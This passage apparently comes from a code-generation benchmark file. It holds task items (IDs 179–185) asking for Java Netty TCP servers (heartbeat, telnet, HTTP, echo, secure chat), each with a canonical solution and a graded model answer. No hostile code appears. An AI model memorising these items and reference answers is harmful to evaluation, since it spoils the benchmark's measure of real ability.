pipeline.addLast(new LineBasedFrameDecoderHandler());\n                          }\n                      });\n            ChannelFuture future = bootstrap.bind(port).sync();\n            future.channel().closeFuture().sync();\n        } finally {\n            workerGroup.shutdownGracefully();\n            bossGroup.shutdownGracefully();\n        }\n    }\n\n    public void shutdown() {\n        workerGroup.shutdownGracefully();\n        bossGroup.shutdownGracefully();\n    }\n\n    public static void main(String[] args) {\n        MyLineBasedFrameDecoderServer server = new MyLineBasedFrameDecoderServer();\n        try {\n            server.start(DEFAULT_PORT);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}\n```\n\nThis code snippet defines a `MyLineBasedFrameDecoderServer` class that sets up a Netty TCP server to listen on a specified port, decode incoming lines, and handle them using a custom handler (`LineBasedFrameDecoderHandler`). The server gracefully shuts down when requested."
  },
  {
    "Task_id": 179,
    "Instruction": "Task Description: Create a Java class that implements a TCP server using Netty framework to handle client connections and manage heartbeat detection.\n\nClass Description: The HeartbeatServer class is a Netty-based TCP server that listens for incoming connections on a specified port, manages client connections using boss and worker event loop groups, and includes proper startup and shutdown procedures.\n\nAttributes:\n- PORT: [static final int] - The port number on which the server will listen for connections\n- bossGroup: [EventLoopGroup] - The parent event loop group that accepts incoming connections\n- workerGroup: [EventLoopGroup] - The child event loop group that handles the traffic of accepted connections\n- bootstrap: [ServerBootstrap] - The server configuration object that binds the server components together\n\nMethods:\n- HeartbeatServer() -> [constructor] - Initializes the server components including event loop groups and server bootstrap\n- start() throws Exception -> [void] - Configures and starts the server, binds to the specified port, and begins accepting connections\n- stop() -> [void] - Shuts down the server gracefully by closing all event loop groups",
    "Canonical_solution": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.logging.LogLevel;\nimport io.netty.handler.logging.LoggingHandler;\n\npublic final class HeartbeatServer {\n    static final int PORT = 8082;\n\n    private EventLoopGroup bossGroup;\n    private EventLoopGroup workerGroup;\n    private ServerBootstrap bootstrap;\n\n    public HeartbeatServer() {\n        bossGroup = new NioEventLoopGroup(1);\n        workerGroup = new NioEventLoopGroup();\n        bootstrap = new ServerBootstrap();\n    }\n\n    public void start() throws Exception {\n        try {\n            bootstrap.group(bossGroup, workerGroup)\n                     .channel(NioServerSocketChannel.class)\n                     .option(ChannelOption.SO_BACKLOG, 100)\n                     .handler(new LoggingHandler(LogLevel.INFO))\n                     .childHandler(new HeartbeatHandlerInitializer());\n\n            ChannelFuture f = bootstrap.bind(PORT).sync();\n            f.channel().closeFuture().sync();\n        } finally {\n            stop();\n        }\n    }\n\n    public void stop() {\n        bossGroup.shutdownGracefully();\n        workerGroup.shutdownGracefully();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "right_result": "```java\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\n\npublic class HeartbeatServer {\n    private static final int PORT = 8080;\n    private EventLoopGroup bossGroup;\n    private EventLoopGroup workerGroup;\n    private ServerBootstrap bootstrap;\n\n    public HeartbeatServer() {\n        this.bossGroup = new NioEventLoopGroup();\n        this.workerGroup = new NioEventLoopGroup();\n        this.bootstrap = new ServerBootstrap()\n                .group(bossGroup, workerGroup)\n                .channel(NioServerSocketChannel.class)\n                .childHandler(new ChannelInitializer<SocketChannel>() {\n                    @Override\n                    protected void initChannel(SocketChannel ch) throws Exception {\n                        // Add your channel handlers here for handling client connections and heartbeats\n                    }\n                });\n    }\n\n    public void start() throws Exception {\n        ChannelFuture future = bootstrap.bind(PORT).sync();\n        System.out.println(\"Server started on port \" + PORT);\n        future.channel().closeFuture().sync();\n    }\n\n    public void stop() {\n        if (bossGroup != null) {\n            bossGroup.shutdownGracefully();\n        }\n        if (workerGroup != null) {\n            workerGroup.shutdownGracefully();\n        }\n        System.out.println(\"Server stopped\");\n    }\n\n    public static void main(String[] args) {\n        try {\n            HeartbeatServer server = new HeartbeatServer();\n            server.start();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 180,
    "Instruction": "Task Description: Create a Java class that implements a TCP server using Netty framework, capable of handling Telnet connections with optional SSL encryption.\n\nClass Description: The TelnetServer class is a Netty-based TCP server implementation that listens for incoming Telnet connections. It supports optional SSL encryption and uses separate thread groups for connection acceptance and request processing. The server logs connection events and properly manages resources during shutdown.\n\nAttributes:\n- SSL: static final boolean - Flag indicating whether SSL encryption should be enabled (configured via system property)\n- PORT: static final int - The port number the server will bind to (configurable via system property, defaults to 8023 or 8992 for SSL)\n\nMethods:\n- start(): void - Starts the Telnet server, binds to the configured port, and begins accepting connections. Throws Exception if any error occurs during startup.\n  Input: None\n  Output: None (void)\n  Description: Initializes SSL context if enabled, creates event loop groups, configures server bootstrap with channel type and handlers, binds to port, and waits for server shutdown. Ensures proper resource cleanup during shutdown.",
    "Canonical_solution": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.logging.LogLevel;\nimport io.netty.handler.logging.LoggingHandler;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.SslContextBuilder;\nimport io.netty.handler.ssl.util.SelfSignedCertificate;\n\npublic final class TelnetServer {\n\n    static final boolean SSL = System.getProperty(\"ssl\") != null;\n    static final int PORT = Integer.parseInt(System.getProperty(\"port\", SSL? \"8992\" : \"8023\"));\n\n    public void start() throws Exception {\n        final SslContext sslCtx;\n        if (SSL) {\n            SelfSignedCertificate ssc = new SelfSignedCertificate();\n            sslCtx = SslContextBuilder.forServer(ssc.certificate(), ssc.privateKey()).build();\n        } else {\n            sslCtx = null;\n        }\n\n        EventLoopGroup bossGroup = new NioEventLoopGroup(1);\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .handler(new LoggingHandler(LogLevel.INFO))\n             .childHandler(new TelnetServerInitializer(sslCtx));\n\n            b.bind(PORT).sync().channel().closeFuture().sync();\n        } finally {\n            bossGroup.shutdownGracefully();\n            workerGroup.shutdownGracefully();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "right_result": "```java\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.codec.string.StringDecoder;\nimport io.netty.handler.codec.string.StringEncoder;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.SslContextBuilder;\nimport io.netty.handler.ssl.util.SelfSignedCertificate;\n\npublic class TelnetServer {\n    private static final boolean SSL = System.getProperty(\"ssl\") != null;\n    private static final int PORT = Integer.parseInt(System.getProperty(\"port\", String.valueOf(SSL ? 8992 : 8023)));\n\n    public static void main(String[] args) throws Exception {\n        new TelnetServer().start();\n    }\n\n    public void start() throws Exception {\n        EventLoopGroup bossGroup = new NioEventLoopGroup(1);\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n        try {\n            SslContext sslCtx = null;\n            if (SSL) {\n                SelfSignedCertificate ssc = new SelfSignedCertificate();\n                sslCtx = SslContextBuilder.forServer(ssc.certificate(), ssc.privateKey()).build();\n            }\n\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .childHandler(new ChannelInitializer<SocketChannel>() {\n                 @Override\n                 public void initChannel(SocketChannel ch) throws Exception {\n                     ChannelPipeline p = ch.pipeline();\n                     if (sslCtx != null) {\n                         p.addLast(sslCtx.newHandler(ch.alloc()));\n                     }\n                     p.addLast(new StringDecoder());\n                     p.addLast(new StringEncoder());\n                     p.addLast(new TelnetServerHandler());\n                 }\n             })\n             .option(ChannelOption.SO_BACKLOG, 128)\n             .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n            ChannelFuture f = b.bind(PORT).sync();\n\n            System.out.println(\"Telnet server started on port \" + PORT);\n\n            f.channel().closeFuture().sync();\n        } finally {\n            workerGroup.shutdownGracefully();\n            bossGroup.shutdownGracefully();\n        }\n    }\n}\n\nclass TelnetServerHandler extends SimpleChannelInboundHandler<String> {\n    @Override\n    protected void channelRead0(ChannelHandlerContext ctx, String msg) throws Exception {\n        // Handle incoming messages here\n        ctx.writeAndFlush(\"Echo: \" + msg);\n    }\n\n    @Override\n    public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {\n        cause.printStackTrace();\n        ctx.close();\n    }\n}\n```"
  },
  {
    "Task_id": 181,
    "Instruction": "Task Description: Implement a TCP server using Java Netty framework that can handle HTTP requests and responses efficiently with proper resource management.\n\nClass Description: NettyTCPServer is a class that creates and manages a TCP server using Netty framework. It handles HTTP protocol communication with clients, including request decoding, response encoding, chunked writes, and message aggregation. The server is designed to be non-blocking and supports graceful shutdown.\n\nAttributes:\nport: int - The port number on which the server will listen for incoming connections\nchannel: Channel - The server's communication channel\nbossGroup: EventLoopGroup - The parent event loop group that accepts incoming connections\nworkerGroup: EventLoopGroup - The child event loop group that handles the traffic of accepted connections\n\nMethods:\nstart(): void - Starts the TCP server on the specified port. Initializes event loop groups, configures server bootstrap with HTTP handlers, and binds to the port. Throws InterruptedException if interrupted during startup.\nshutdown(): void - Gracefully shuts down the server by closing the channel and shutting down event loop groups. Handles any InterruptedException during shutdown.\n\nThe class uses Netty's NIO transport and includes HTTP-specific handlers for proper protocol handling. It maintains proper resource management through graceful shutdown mechanisms.",
    "Canonical_solution": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.codec.http.HttpObjectAggregator;\nimport io.netty.handler.codec.http.HttpRequestDecoder;\nimport io.netty.handler.codec.http.HttpResponseEncoder;\nimport io.netty.handler.stream.ChunkedWriteHandler;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\npublic class NettyTCPServer {\n\n    private static final Logger Logger = LoggerFactory.getLogger(NettyTCPServer.class);\n    private int port;\n    private Channel channel;\n    private EventLoopGroup bossGroup;\n    private EventLoopGroup workerGroup;\n\n    public NettyTCPServer(int port) {\n        this.port = port;\n    }\n\n    public void start() throws InterruptedException {\n        bossGroup = new NioEventLoopGroup(2);\n        workerGroup = new NioEventLoopGroup();\n\n        try {\n            final ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n                .channel(NioServerSocketChannel.class)\n                .option(ChannelOption.SO_BACKLOG, 10240)\n                .childOption(ChannelOption.SO_KEEPALIVE, true)\n                .option(ChannelOption.SO_REUSEADDR, true)\n                .childOption(ChannelOption.TCP_NODELAY, true)\n                .childOption(ChannelOption.SO_SNDBUF, 1024*64)\n                .childOption(ChannelOption.SO_RCVBUF, 1024*64)\n                .childHandler(new ChannelInitializer<SocketChannel>() {\n                    @Override\n                    protected void initChannel(SocketChannel socketChannel) throws Exception {\n                        socketChannel.pipeline().addLast(new HttpRequestDecoder());\n                        socketChannel.pipeline().addLast(new HttpResponseEncoder());\n                        socketChannel.pipeline().addLast(new ChunkedWriteHandler());\n                        socketChannel.pipeline().addLast(new HttpObjectAggregator(100 * 1024 * 1024));\n                    }\n                });\n\n            channel = b.bind(port).sync().channel();\n            Logger.info(\"Server started on port {}\", port);\n        } catch (Exception e) {\n            Logger.error(\"Failed to start server on port {}: {}\", port, e.getMessage());\n            throw e;\n        }\n    }\n\n    public void shutdown() {\n        if (channel != null) {\n            channel.close();\n            try {\n                channel.closeFuture().sync();\n            } catch (InterruptedException e) {\n                Logger.error(\"Error during server shutdown: {}\", e.getMessage());\n            }\n        }\n        if (bossGroup != null) {\n            bossGroup.shutdownGracefully();\n        }\n        if (workerGroup != null) {\n            workerGroup.shutdownGracefully();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "right_result": "```java\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.codec.http.*;\n\npublic class NettyTCPServer {\n    private final int port;\n    private Channel channel;\n    private EventLoopGroup bossGroup;\n    private EventLoopGroup workerGroup;\n\n    public NettyTCPServer(int port) {\n        this.port = port;\n    }\n\n    public void start() throws InterruptedException {\n        bossGroup = new NioEventLoopGroup();\n        workerGroup = new NioEventLoopGroup();\n\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .childHandler(new ChannelInitializer<SocketChannel>() {\n                 @Override\n                 protected void initChannel(SocketChannel ch) throws Exception {\n                     ChannelPipeline pipeline = ch.pipeline();\n                     pipeline.addLast(new HttpServerCodec());\n                     pipeline.addLast(new HttpObjectAggregator(65536));\n                     pipeline.addLast(new ChunkedWriteHandler());\n                     pipeline.addLast(new SimpleChannelInboundHandler<FullHttpRequest>() {\n                         @Override\n                         protected void channelRead0(ChannelHandlerContext ctx, FullHttpRequest req) throws Exception {\n                             // Handle HTTP request\n                             FullHttpResponse res = new DefaultFullHttpResponse(HttpVersion.HTTP_1_1, HttpResponseStatus.OK);\n                             ctx.writeAndFlush(res).addListener(ChannelFutureListener.CLOSE);\n                         }\n                     });\n                 }\n             });\n\n            ChannelFuture f = b.bind(port).sync();\n            channel = f.channel().closeFuture().sync().channel();\n        } finally {\n            workerGroup.shutdownGracefully();\n            bossGroup.shutdownGracefully();\n        }\n    }\n\n    public void shutdown() {\n        if (channel != null) {\n            channel.close();\n        }\n        workerGroup.shutdownGracefully();\n        bossGroup.shutdownGracefully();\n    }\n}\n```"
  },
  {
    "Task_id": 182,
    "Instruction": "Task Description: Create a Java class that implements a TCP server using Netty framework to echo back any received messages to clients.\n\nClass Description: The EchoServer class is a Netty-based TCP server that listens on a specified port and echoes back any data received from connected clients. It manages server lifecycle including startup, shutdown, and resource cleanup.\n\nAttributes:\n- bossGroup: [NioEventLoopGroup] - Handles incoming connection requests and distributes them to workerGroup\n- workerGroup: [NioEventLoopGroup] - Handles I/O operations for established connections\n- bootstrap: [ServerBootstrap] - Netty server configuration and management object\n- DEFAULT_PORT: [int] - Default port number (7) to use when no port is specified\n\nMethods:\n- EchoServer() -> [void] - Constructor that initializes bossGroup, workerGroup and bootstrap\n- start([int port]) -> [void] - Starts the server on specified port, configures channel pipeline and binds to port\n- shutdown() -> [void] - Gracefully shuts down the server and releases all resources\n- main([String[] args]) -> [void] - Entry point that parses command line arguments and starts the server",
    "Canonical_solution": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\n\npublic class EchoServer {\n\n    public static int DEFAULT_PORT = 7;\n\n    private EventLoopGroup bossGroup;\n    private EventLoopGroup workerGroup;\n    private ServerBootstrap bootstrap;\n\n    public EchoServer() {\n        this.bossGroup = new NioEventLoopGroup();\n        this.workerGroup = new NioEventLoopGroup();\n        this.bootstrap = new ServerBootstrap();\n    }\n\n    public void start(int port) throws InterruptedException {\n        try {\n            bootstrap.group(bossGroup, workerGroup)\n                .channel(NioServerSocketChannel.class)\n                .childHandler(new EchoServerHandler())\n                .option(ChannelOption.SO_BACKLOG, 128)\n                .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n            ChannelFuture f = bootstrap.bind(port).sync();\n            System.out.println(\"EchoServer\u5df2\u542f\u52a8\uff0c\u7aef\u53e3\uff1a\" + port);\n            f.channel().closeFuture().sync();\n        } finally {\n            shutdown();\n        }\n    }\n\n    public void shutdown() {\n        workerGroup.shutdownGracefully();\n        bossGroup.shutdownGracefully();\n    }\n\n    public static void main(String[] args) throws Exception {\n        int port;\n        try {\n            port = Integer.parseInt(args[0]);\n        } catch (RuntimeException ex) {\n            port = DEFAULT_PORT;\n        }\n\n        EchoServer server = new EchoServer();\n        server.start(port);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "right_result": "```java\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\n\npublic class EchoServer {\n    private final EventLoopGroup bossGroup = new NioEventLoopGroup();\n    private final EventLoopGroup workerGroup = new NioEventLoopGroup();\n    private ServerBootstrap bootstrap;\n    private static final int DEFAULT_PORT = 7;\n\n    public EchoServer() {\n        bootstrap = new ServerBootstrap()\n                .group(bossGroup, workerGroup)\n                .channel(NioServerSocketChannel.class)\n                .childHandler(new ChannelInitializer<SocketChannel>() {\n                    @Override\n                    protected void initChannel(SocketChannel ch) throws Exception {\n                        ch.pipeline().addLast(new SimpleChannelInboundHandler<String>() {\n                            @Override\n                            protected void channelRead0(ChannelHandlerContext ctx, String msg) throws Exception {\n                                ctx.writeAndFlush(msg);\n                            }\n                        });\n                    }\n                })\n                .option(ChannelOption.SO_BACKLOG, 128)\n                .childOption(ChannelOption.SO_KEEPALIVE, true);\n    }\n\n    public void start(int port) throws InterruptedException {\n        ChannelFuture f = bootstrap.bind(port).sync();\n        f.channel().closeFuture().sync();\n    }\n\n    public void shutdown() {\n        workerGroup.shutdownGracefully();\n        bossGroup.shutdownGracefully();\n    }\n\n    public static void main(String[] args) {\n        int port = DEFAULT_PORT;\n        if (args.length > 0) {\n            port = Integer.parseInt(args[0]);\n        }\n        try {\n            new EchoServer().start(port);\n        } catch (InterruptedException e) {\n            Thread.currentThread().interrupt();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 183,
    "Instruction": "Task Description: Create a Java class that implements a secure TCP chat server using Netty framework, supporting SSL/TLS encryption for secure communication between clients and the server.\n\nClass Description: SecureChatServer is a Netty-based TCP server that listens for incoming client connections on a specified port, establishes secure SSL/TLS encrypted channels, and handles chat communication. The server uses a boss-worker thread model for efficient connection handling.\n\nAttributes:\nPORT: [static final int] - The port number on which the server listens for incoming connections, defaulting to 8992 if not specified via system property.\n\nMethods:\nstart: [start]() -> [void] - Initializes and starts the secure chat server. Creates a self-signed SSL certificate, configures Netty's event loop groups, sets up server bootstrap with SSL context and channel handlers, binds to the specified port, and maintains server operation until shutdown. Handles resource cleanup during shutdown.\n- Throws: Exception if any error occurs during server startup or operation",
    "Canonical_solution": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.logging.LogLevel;\nimport io.netty.handler.logging.LoggingHandler;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.util.SelfSignedCertificate;\n\npublic final class SecureChatServer {\n\n    static final int PORT = Integer.parseInt(System.getProperty(\"port\", \"8992\"));\n\n    public void start() throws Exception {\n        SelfSignedCertificate ssc = new SelfSignedCertificate();\n        SslContext sslCtx = SslContext.newServerContext(ssc.certificate(), ssc.privateKey());\n\n        EventLoopGroup bossGroup = new NioEventLoopGroup(1);\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .handler(new LoggingHandler(LogLevel.INFO))\n             .childHandler(new SecureChatServerInitializer(sslCtx));\n\n            b.bind(PORT).sync().channel().closeFuture().sync();\n        } finally {\n            bossGroup.shutdownGracefully();\n            workerGroup.shutdownGracefully();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "right_result": "```java\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelPipeline;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.SslContextBuilder;\nimport io.netty.handler.ssl.util.SelfSignedCertificate;\n\npublic class SecureChatServer {\n    private static final int PORT = Integer.parseInt(System.getProperty(\"port\", \"8992\"));\n\n    public void start() throws Exception {\n        SelfSignedCertificate ssc = new SelfSignedCertificate();\n        SslContext sslCtx = SslContextBuilder.forServer(ssc.certificate(), ssc.privateKey()).build();\n\n        EventLoopGroup bossGroup = new NioEventLoopGroup(1);\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .childHandler(new ChannelInitializer<SocketChannel>() {\n                 @Override\n                 protected void initChannel(SocketChannel ch) throws Exception {\n                     ChannelPipeline p = ch.pipeline();\n                     p.addLast(sslCtx.newHandler(ch.alloc()));\n                     // Add your chat message handler here\n                 }\n             });\n\n            ChannelFuture f = b.bind(PORT).sync();\n            f.channel().closeFuture().sync();\n        } finally {\n            workerGroup.shutdownGracefully();\n            bossGroup.shutdownGracefully();\n        }\n    }\n\n    public static void main(String[] args) throws Exception {\n        new SecureChatServer().start();\n    }\n}\n```"
  },
  {
    "Task_id": 184,
    "Instruction": "Task Description: Create a Java class that implements a TCP server using Netty framework to handle incoming client connections and echo back received messages. The server should support optional SSL encryption and be configurable via system properties.\n\nClass Description: EchoServer is a Netty-based TCP server that listens for incoming connections on a specified port and echoes back any received data. It supports optional SSL encryption and uses NIO for non-blocking I/O operations.\n\nAttributes:\n- SSL: boolean - Flag indicating whether SSL encryption should be enabled (configured via system property \"ssl\")\n- PORT: int - The port number on which the server will listen (configured via system property \"port\", defaults to 8007)\n\nMethods:\n- start(): void - Starts the Netty TCP server, configures SSL if enabled, sets up event loop groups, and binds to the specified port. Throws Exception if any error occurs during startup.\n  - Input: None\n  - Output: None (void)\n  - Description: Initializes the server with boss and worker event loop groups, configures the server bootstrap with channel options and handlers, and starts listening for incoming connections. The method blocks until the server channel is closed.",
    "Canonical_solution": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.logging.LogLevel;\nimport io.netty.handler.logging.LoggingHandler;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.SslContextBuilder;\nimport io.netty.handler.ssl.util.SelfSignedCertificate;\n\npublic final class EchoServer {\n\n    static final boolean SSL = System.getProperty(\"ssl\") != null;\n    static final int PORT = Integer.parseInt(System.getProperty(\"port\", \"8007\"));\n\n    public void start() throws Exception {\n        final SslContext sslCtx;\n        if (SSL) {\n            SelfSignedCertificate ssc = new SelfSignedCertificate();\n            sslCtx = SslContextBuilder.forServer(ssc.certificate(), ssc.privateKey()).build();\n        } else {\n            sslCtx = null;\n        }\n\n        EventLoopGroup bossGroup = new NioEventLoopGroup(1);\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n        final EchoServerHandler serverHandler = new EchoServerHandler();\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .option(ChannelOption.SO_BACKLOG, 100)\n             .handler(new LoggingHandler(LogLevel.INFO))\n             .childHandler(new ChannelInitializer<SocketChannel>() {\n                 @Override\n                 public void initChannel(SocketChannel ch) throws Exception {\n                     ChannelPipeline p = ch.pipeline();\n                     if (sslCtx != null) {\n                         p.addLast(sslCtx.newHandler(ch.alloc()));\n                     }\n                     p.addLast(serverHandler);\n                 }\n             });\n\n            ChannelFuture f = b.bind(PORT).sync();\n            f.channel().closeFuture().sync();\n        } finally {\n            bossGroup.shutdownGracefully();\n            workerGroup.shutdownGracefully();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "right_result": "```java\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.codec.string.StringDecoder;\nimport io.netty.handler.codec.string.StringEncoder;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.SslContextBuilder;\nimport io.netty.handler.ssl.util.SelfSignedCertificate;\n\npublic class EchoServer {\n    private static final boolean SSL = System.getProperty(\"ssl\") != null;\n    private static final int PORT = Integer.parseInt(System.getProperty(\"port\", \"8007\"));\n\n    public static void main(String[] args) throws Exception {\n        new EchoServer().start();\n    }\n\n    public void start() throws Exception {\n        EventLoopGroup bossGroup = new NioEventLoopGroup(1);\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .childHandler(new ChannelInitializer<SocketChannel>() {\n                 @Override\n                 public void initChannel(SocketChannel ch) throws Exception {\n                     ChannelPipeline p = ch.pipeline();\n                     if (SSL) {\n                         SslContext sslCtx = getSSLScontext();\n                         p.addLast(sslCtx.newHandler(ch.alloc()));\n                     }\n                     p.addLast(new StringDecoder());\n                     p.addLast(new StringEncoder());\n                     p.addLast(new EchoServerHandler());\n                 }\n             })\n             .option(ChannelOption.SO_BACKLOG, 128)\n             .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n            ChannelFuture f = b.bind(PORT).sync();\n            f.channel().closeFuture().sync();\n        } finally {\n            workerGroup.shutdownGracefully();\n            bossGroup.shutdownGracefully();\n        }\n    }\n\n    private SslContext getSSLScontext() throws Exception {\n        SelfSignedCertificate ssc = new SelfSignedCertificate();\n        return SslContextBuilder.forServer(ssc.certificate(), ssc.privateKey()).build();\n    }\n}\n\nclass EchoServerHandler extends SimpleChannelInboundHandler<String> {\n    @Override\n    protected void channelRead0(ChannelHandlerContext ctx, String msg) throws Exception {\n        ctx.writeAndFlush(msg);\n    }\n\n    @Override\n    public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) throws Exception {\n        cause.printStackTrace();\n        ctx.close();\n    }\n}\n```"
  },
  {
    "Task_id": 185,
    "Instruction": "Task Description: Create a Java class that implements a TCP server using Netty framework to handle incoming client connections and process TCP requests.\n\nClass Description: The AndroidControlServer class is a Netty-based TCP server that listens on a specified port, accepts incoming client connections, and processes TCP requests using a custom handler. It manages server resources and provides graceful shutdown capabilities.\n\nAttributes:\n- bossGroup: [NioEventLoopGroup] - Handles incoming connection requests and accepts them\n- workerGroup: [NioEventLoopGroup] - Processes the accepted connections' network traffic\n\nMethods:\n- listen: [listen(int port)] -> [void] - Starts the TCP server on the specified port, configures server options, and sets up the request handler pipeline. The method blocks until the server channel is closed.\n  - Input Parameters:\n    - port: [int] - The port number on which the server should listen\n  - Throws:\n    - InterruptedException - If the thread is interrupted while waiting for the server to shutdown",
    "Canonical_solution": "import com.yeetor.server.handler.TCPHandler;\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\n\npublic class AndroidControlServer {\n\n    private EventLoopGroup bossGroup = new NioEventLoopGroup();\n    private EventLoopGroup workerGroup = new NioEventLoopGroup();\n\n    public void listen(int port) throws InterruptedException {\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n                    .channel(NioServerSocketChannel.class)\n                    .option(ChannelOption.SO_BACKLOG, 128)\n                    .childOption(ChannelOption.SO_KEEPALIVE, true)\n                    .childHandler(new ChannelInitializer<SocketChannel>() {\n                        @Override\n                        public void initChannel(SocketChannel ch) throws Exception {\n                            ch.pipeline().addLast(\"tcp\", new TCPHandler());\n                        }\n                    });\n            ChannelFuture f = b.bind(port).sync();\n            f.channel().closeFuture().sync();\n        } finally {\n            workerGroup.shutdownGracefully();\n            bossGroup.shutdownGracefully();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
